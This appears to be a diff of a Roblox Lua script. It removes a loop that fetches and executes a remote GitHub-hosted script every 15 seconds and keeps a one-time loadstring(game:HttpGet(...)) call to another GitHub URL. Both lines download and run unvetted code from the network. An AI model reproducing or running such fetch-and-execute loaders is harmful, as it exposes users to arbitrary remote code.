@@ -1,10 +1,4 @@
 task.spawn(function()
-    while task.wait(15) do
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaAnarchist/YeuEmNhieuLam/refs/heads/main/helloword.lua"))()
-    end
-end)
-
-task.spawn(function()
     pcall(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/traurobloxdeptrai/traukhoaito/refs/heads/main/anhdomixi.lua"))()
     end)
